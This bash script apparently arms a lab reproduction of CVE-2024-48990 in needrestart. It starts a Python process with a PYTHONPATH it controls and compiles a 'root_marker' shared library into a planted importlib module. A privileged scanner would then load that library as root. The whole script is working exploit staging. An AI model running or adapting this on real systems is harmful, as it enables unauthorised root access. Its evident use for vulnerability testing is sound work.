#!/usr/bin/env bash
set -euo pipefail

# Preconditions
[[ "$(id -u)" -ne 0 ]] || { echo "run as the developer, not root" >&2; exit 1; }
command -v cc >/dev/null || { echo "C compiler required" >&2; exit 1; }
command -v python3 >/dev/null
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURE_DIR="${HOME}/.local/share/package-lab/cve-2024-48990"
PID_FILE="${FIXTURE_DIR}/python.pid"
LOOP_FILE="${FIXTURE_DIR}/loop.py"

# Python fixture
if [[ -f "$PID_FILE" ]]; then
  OLD_PID="$(cat "$PID_FILE")"
  [[ "$OLD_PID" =~ ^[0-9]+$ ]] && kill "$OLD_PID" 2>/dev/null || true
fi
rm -rf "$FIXTURE_DIR"
mkdir -p "$FIXTURE_DIR/importlib"
printf 'import time\ntime.sleep(86400)\n' > "$LOOP_FILE"
PYTHONPATH="$FIXTURE_DIR" nohup /usr/bin/python3 "$LOOP_FILE" >/dev/null 2>&1 &
PYTHON_PID=$!
echo "$PYTHON_PID" > "$PID_FILE"
sleep 1
kill -0 "$PYTHON_PID"
cc -shared -fPIC -O2 -Wall -Wextra "$SCRIPT_DIR/root_marker.c" -o "$FIXTURE_DIR/importlib/__init__.so.tmp"
mv "$FIXTURE_DIR/importlib/__init__.so.tmp" "$FIXTURE_DIR/importlib/__init__.so"
chmod 0700 "$FIXTURE_DIR"
chmod 0755 "$FIXTURE_DIR/importlib"
chmod 0644 "$FIXTURE_DIR/importlib/__init__.so"
printf 'armed pid=%s PYTHONPATH=%s\n' "$PYTHON_PID" "$FIXTURE_DIR"
